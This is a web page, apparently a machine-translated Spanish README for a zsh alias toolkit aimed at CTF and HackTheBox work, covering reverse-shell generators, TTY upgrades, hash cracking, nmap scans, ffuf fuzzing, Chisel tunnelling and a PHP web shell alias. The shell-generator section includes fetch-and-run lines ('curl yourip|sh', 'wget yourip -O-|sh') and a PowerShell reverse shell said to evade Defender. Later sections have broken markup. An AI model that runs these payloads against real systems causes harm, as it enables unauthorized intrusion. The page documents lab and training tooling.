@@ -1,0 +1,480 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zsh-aliases - Alias y scripts para facilitar tareas comunes.</title>
+    <meta name="description" content="Alias y scripts para facilitar tareas comunes.">
+    <meta name="keywords" content="zsh-aliases, Spanish, documentation, GitHub, open source">
+    <meta name="author" content="OpenAiTx">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "zsh-aliases",
+  "description": "Alias y scripts para facilitar tareas comunes.",
+  "author": {
+    "@type": "Person",
+    "name": "jazzpizazz"
+  },
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Any",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "5",
+    "ratingCount": 176
+  },
+  "url": "https://OpenAiTx.github.io/projects/jazzpizazz/zsh-aliases/README-es.html",
+  "sameAs": "https://raw.githubusercontent.com/jazzpizazz/zsh-aliases/main/README.md",
+  "datePublished": "2026-05-07",
+  "dateModified": "2026-05-07"
+}
+    </script>
+    
+    <!-- GitHub-style CSS -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #24292e;
+            background-color: #ffffff;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #ffffff;
+            border: 1px solid #e1e4e8;
+            border-radius: 6px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .header {
+            border-bottom: 1px solid #e1e4e8;
+            padding-bottom: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .project-title {
+            font-size: 2em;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .project-title a {
+            color: #24292e;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: color 0.2s ease;
+        }
+        
+        .project-title a:hover {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        
+        .project-title .github-icon {
+            width: 1em;
+            height: 1em;
+            fill: currentColor;
+            opacity: 0.7;
+            transition: opacity 0.2s ease;
+        }
+        
+        .project-title a:hover .github-icon {
+            opacity: 1;
+        }
+        
+        .project-meta {
+            color: #586069;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        .stars {
+            display: inline-block;
+            margin-right: 16px;
+        }
+        
+        .language {
+            display: inline-block;
+            background-color: #f1f8ff;
+            color: #0366d6;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .content {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        h1, h2, h3, h4, h5, h6 {
+            margin-top: 24px;
+            margin-bottom: 16px;
+            font-weight: 600;
+            line-height: 1.25;
+            color: #24292e;
+        }
+        
+        h1 { font-size: 2em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
+        h2 { font-size: 1.5em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
+        h3 { font-size: 1.25em; }
+        
+        p {
+            margin-bottom: 16px;
+        }
+        
+        code {
+            background-color: #f6f8fa;
+            border-radius: 3px;
+            font-size: 85%;
+            margin: 0;
+            padding: 0.2em 0.4em;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+        }
+        
+        pre {
+            background-color: #f6f8fa;
+            border-radius: 6px;
+            font-size: 85%;
+            line-height: 1.45;
+            overflow: auto;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        
+        pre code {
+            background-color: transparent;
+            border: 0;
+            display: inline;
+            line-height: inherit;
+            margin: 0;
+            overflow: visible;
+            padding: 0;
+            word-wrap: normal;
+        }
+        
+        a {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        
+        ul, ol {
+            margin-bottom: 16px;
+            padding-left: 2em;
+        }
+        
+        li {
+            margin-bottom: 0.25em;
+        }
+        
+        blockquote {
+            border-left: 4px solid #dfe2e5;
+            color: #6a737d;
+            margin: 0 0 16px 0;
+            padding: 0 1em;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e4e8;
+            color: #586069;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #0366d6;
+        }
+        
+        .original-link {
+            margin-top: 16px;
+            padding: 12px;
+            background-color: #f6f8fa;
+            border-radius: 6px;
+            border: 1px solid #e1e4e8;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                padding: 16px;
+            }
+            
+            .project-title {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+    
+    <!-- Prism.js for syntax highlighting -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+    <!-- Bing Count -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "sh95yd6uwt");
+    </script>        
+
+    <!-- Statcounter -->
+    <script type="text/javascript">
+        var sc_project = 13142514;
+        var sc_invisible = 1;
+        var sc_security = "d03a31d8"; 
+    </script>
+    <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+    <noscript>
+        <div class="statcounter"><a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img
+                    class="statcounter" src="https://c.statcounter.com/13142514/0/d03a31d8/1/" alt="Web Analytics"
+                    referrerPolicy="no-referrer-when-downgrade"></a></div>
+    </noscript>    
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="project-title">
+                <a href="https://github.com/jazzpizazz/zsh-aliases" target="_blank" rel="noopener noreferrer">
+                    <svg class="github-icon" viewBox="0 0 16 16" aria-hidden="true">
+                        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                    </svg>
+                    zsh-aliases
+                </a>
+            </h1>
+            <div class="project-meta">
+                <span class="stars">⭐ 176 stars</span>
+                <span class="language">Spanish</span>
+                <span>by jazzpizazz</span>
+            </div>
+        </div>
+        
+        <div class="content">
+            <h1>Cosas para CTFs, HTB, THM, etc</h1>
+Contiene alias y scripts que uso frecuentemente. Solo clona este repositorio <strong>en tu carpeta de inicio</strong> y ejecuta <code>echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc</code>. Después de reiniciar zsh deberías poder usar todos los alias y scripts. Solo probado en Kali Linux, puede que necesites instalar dependencias adicionales en otras distribuciones. 
+<blockquote>#### Descargo de responsabilidad</blockquote>
+<blockquote>La mayoría de esos alias probablemente sean malos, siéntete libre de enviar una solicitud de extracción para reducir la "pepeganidad". Para mí, el hecho de que funcione es suficiente para usarlos por ahora :D</blockquote>
+<h2>Varios</h2>
+<h3>> www</h3></p><p>Inicia un servidor HTTP en el puerto 80 en el directorio actual. También imprime una lista de las direcciones IP asociadas a cada NIC, muestra la ruta del directorio actual y lista los archivos. 
+Ejemplo:
+<pre><code class="language-">┌──(jazz㉿kali)-[/tmp/www]
+└─$ www
+[eth0] 192.168.172.128
+[/tmp/www]
+linpeas.sh  pspy64
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Se utiliza sudo para asegurar la capacidad de escuchar en el puerto 80</blockquote></p><h3>> tun0</h3></p><p>Copia la dirección IP de la interfaz tun0 al portapapeles. 
+Ejemplo: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ tun0 </code></pre>
+Contenido del portapapeles después:
+<pre><code class="language-">10.10.14.41</code></pre></p><h3>> mkdir_cd</h3>
+A menudo, cuando creo un directorio, quiero entrar directamente en él con <code>cd</code> después. Esto hace exactamente eso.  
+Ejemplo: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ mkdir_cd pepega</p><p>┌──(jazz㉿kali)-[~/jazz/pepega]
+└─$ </code></pre></p><h2>Shells inversos</h2>
+<h3>> gen_lin_rev $ip $port </h3>
+Basado en <a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener noreferrer">RSaaS</a>. Crea un archivo llamado <code>index.html</code> en el directorio actual. Este archivo contiene múltiples cargas útiles de shell inverso que se intentarán en secuencia hasta que una funcione. Puede usarse con <code>www</code> para hacer que generar un shell inverso tras obtener RCE sea extremadamente fácil y rápido. Solo hay que hacer que el objetivo ejecute <code>curl tuip|sh</code> y recuperará la carga útil del shell inverso desde tu servidor web y -esperemos- se conectará a tu escucha. 
+Ejemplo:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_lin_rev 127.0.0.1 1337
+[+] Wrote Linux reverse shells to /home/jazz/index.html</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Me gusta mucho cómo la carga útil <code>curl yourip|sh</code> realmente no tiene caracteres malos además posiblemente del espacio y la barra vertical. Cuando los espacios son un problema, hay <a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces" target="_blank" rel="noopener noreferrer">formas de evitar esto</a> y la barra vertical puede ser evitada simplemente descargando y ejecutando por separado.</blockquote>
+<blockquote>- Si curl no está instalado en la máquina remota, puedes probar <code>wget yourip -O-|sh</code></blockquote>
+ 
+<h3>> gen_php_rev $ip $port</h3></p><p>Genera el <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">PentestMonkey PHP reverse shell</a> con la ip y puerto suministrados y lo guarda en el directorio actual.  
+Ejemplo:</p><pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_php_rev 127.0.0.1 1337                                                              
+[+] Wrote PHP reverse shell to /home/jazz/jazz.php</code></pre>
+<h3>> gen_ps_rev $ip $port</h3>
+Genera un shell reverso de Powershell con la IP y puerto suministrados que en el momento del último uso evitó defender. No estoy seguro a quién darle crédito por esta carga útil. 
+Ejemplo:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_ps_rev 127.0.0.1 1337</code></pre>
+Contenido del portapapeles después:
+<pre><code class="language-">powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...</code></pre></p><h2>Actualizaciones de TTY</h2>
+<h3>> uptty</h3>
+Copia el comando de actualización tty de python(2) y python3 al portapapeles. 
+Ejemplo: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ uptty</code></pre>
+Contenido del portapapeles después:
+<pre><code class="language-">python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Requiere que <code>xclip</code> esté instalado</blockquote>
+<blockquote>- <code>py_tty_upgrade</code> y <code>py3_tty_upgrade</code> todavía están incluidos por ahora pero llamarán a este alias en su lugar</blockquote></p><h3>> script_tty_upgrade</h3>
+Cuando Python no está instalado en la máquina remota, puedes usar este comando para copiar el método <code>script</code> para actualizar a una shell tty en tu portapapeles. 
+Ejemplo: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ script_tty_upgrade</code></pre>
+Contenido del portapapeles después:
+<pre><code class="language-">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Requiere que <code>xclip</code> esté instalado</blockquote></p><h3>> tty_fix</h3>
+Ejecuta <code>stty raw -echo; fg; reset</code> y debe usarse después de usar una de las actualizaciones de tty mencionadas arriba.</p><h3>> tty_conf</h3>
+Obtiene la configuración actual del tty (número de filas y columnas) y copia un comando de una línea al portapapeles que puede pegarse directamente en la ventana de tu shell inverso para que esas configuraciones coincidan. Esto soluciona el problema del ajuste de línea que ocurre a mitad de tu terminal. 
+Ejemplo: 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ tty_conf               </code></pre>
+Contenido del portapapeles después:
+<pre><code class="language-">stty rows 30 columns 116</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Requiere que <code>xclip</code> esté instalado</blockquote></p><h2>Crackeo de hashes</h2>
+<h3>> rock_john $archivo_hash (argumentos adicionales)</h3>
+En lugar de suministrar manualmente rockyou como argumento con <code>--wordlist=/usr/share/wordlists/rockyou.txt</code> (sin autocompletado :/) este alias inyecta ese argumento y por lo tanto puede usarse para intentar crackear un hash usando JohnTheRipper y la lista de palabras rockyou más fácilmente.
+Ejemplo:
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ rock_john hash.txt --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jazz             (?)     
+1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- ¡Parece que Kali solucionó la autocompletación para John en 2022.2! Sin embargo, este alias aún te ahorra algo de esfuerzo ;)</blockquote>
+<h2>Escaneo de puertos</h2>
+<h3>> nmap_tcp $ip (argumentos adicionales)</h3>
+Inicia un escaneo TCP con nmap usando mis configuraciones predeterminadas y guarda los resultados del escaneo en un directorio nmap que se crea automáticamente si aún no existe.
+Ejemplo:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ nmap_default 127.0.0.1
+[i] Creating /home/jazz/nmap...
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
+...</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Esto solo escanea los puertos TCP predeterminados. Añade <code>-p-</code> como argumento para escanear todos los puertos.</blockquote>
+<blockquote>- Usa <code>sudo</code> para obtener los privilegios necesarios para un escaneo SYN</blockquote>
+<h3>> nmap_udp $ip (argumentos adicionales)</h3>
+Inicia un escaneo UDP con nmap usando mis configuraciones predeterminadas y guarda los resultados en un directorio nmap que se crea automáticamente si no existe aún.
+Ejemplo:
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ nmap_udp 127.0.0.1
+[i] Creating /home/jazz/nmap...
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
+...</code></pre>
+<blockquote>#### Notas</blockquote>
+<blockquote>- Esto solo escanea los puertos UDP predeterminados. Añade <code>-p-</code> como argumento para escanear todos los puertos.</blockquote>
+<blockquote>- Usa <code>sudo</code> para obtener los privilegios necesarios para un escaneo UDP</blockquote></p><h2>Ruta de SecLists</h2></p><blockquote>#### Notas</blockquote>
+<blockquote>- Muchas de las funciones en este conjunto de herramientas usan listas de palabras del proyecto SecLists. Para asegurar que estas funciones funcionen correctamente, los scripts necesitan saber dónde encontrar el directorio SecLists. El conjunto de herramientas usa la siguiente lógica para localizar SecLists:</blockquote></p><ul><li>Primero, verifica si existe <code>/opt/seclists/</code>.</li>
+<li>Si no, verifica si existe <code>/usr/share/seclists/</code>.</li>
+<li>Si ninguno de estos directorios existe, busca una variable de entorno llamada <code>SECLISTS_PATH</code>.</li></p><p></ul>Para configurar SecLists para usar con estos scripts:</p><ul><li>Instala SecLists en una de las ubicaciones estándar (<code>/opt/seclists/</code> o <code>/usr/share/seclists/</code>).</li>
+   
+   </ul>O</p><ul><li>Configura la variable de entorno <code>SECLISTS_PATH</code> para que apunte a tu instalación de SecLists:</li></p><p>   </ul><pre><code class="language-bash">   export SECLISTS_PATH="/path/to/seclists"
+   # You can add this line to your .zshrc file to make it permanent.
+    ``<code></p><h2>Fuzzing Web</h2>
+<h3>> vhost $domain (-w lista_de_palabras) (argumentos extra)</h3>
+Realiza el descubrimiento de host virtual usando ffuf.
+Ejemplo:</code></pre>
+┌──(22sh㉿kali)-[~]
+└─$ vhost box.htb
+<pre><code class="language-">> #### Notas
+<blockquote>- Al pasar solo el dominio se usará http, sin embargo, también puedes pasar la url completa https://box.htb para https</blockquote>
+<blockquote>- Requiere que </code>ffuf<code> esté instalado</blockquote>
+<h3>> fuzz_dir $url (argumentos extra)</h3>
+Realiza fuzzing de directorios y archivos usando ffuf.
+Ejemplo:</code></pre>
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -fs 245</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
+<pre><code class="language-">> #### Notas
+<blockquote>- Requiere tener instalado </code>ffuf<code></blockquote>
+<h2>Tunelización con Chisel</h2>
+<h3>> chisel_socks $ip $port</h3>
+Configura un proxy SOCKS usando Chisel y copia el comando al portapapeles.
+Ejemplo:
+</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_socks 10.10.14.10 8888
+[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
+2024/08/05 23:31:03 server: Reverse tunnelling enabled
+2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
+2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
+<pre><code class="language-">### > chisel_forward $local_ip $local_port $remote_ip $remote_port
+Configura el reenvío de puertos usando Chisel.
+Ejemplo:
+</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
+[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
+[+] Run this on the target machine
+2024/08/05 23:32:30 server: Reverse tunnelling enabled
+2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
+2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
+<pre><code class="language-">## Gestión de Hosts
+<h3>> addhost $ip $hostname</h3>
+Agrega o actualiza una entrada en el archivo /etc/hosts.
+Ejemplo:</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.234 big.box.htb 
+[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
+10.10.11.234 boss.htb big.boss.htb big.box.htb</p><p>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.235 newbox.htb 
+[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
+10.10.11.235 newbox.htb
+</code>`<code>
+<h2>Alias adicionales</h2>
+<ul><li></code>linpeas<code>: Descarga la última versión de LinPEAS.</li>
+<li></code>upload<code>: Sube un archivo usando bashupload.com.</li>
+<li></code>phpcmd<code>: Crea una web shell PHP simple.</li>
+<li></code>burl`: curl usando el proxy de burpsuite.</li></p><p>
+
+</ul>---
+
+Tranlated By <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">Open Ai Tx</a> | Last indexed: 2026-05-07
+
+---</p>
+        </div>
+        
+        <div class="original-link">
+            <strong>Original README:</strong> <a href="https://raw.githubusercontent.com/jazzpizazz/zsh-aliases/main/README.md" target="_blank" rel="noopener noreferrer">View on GitHub</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>Translated by <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">OpenAiTx</a> | 
+        Last updated: 2026-05-07 
+    </div>
+    
+</body>
+</html>
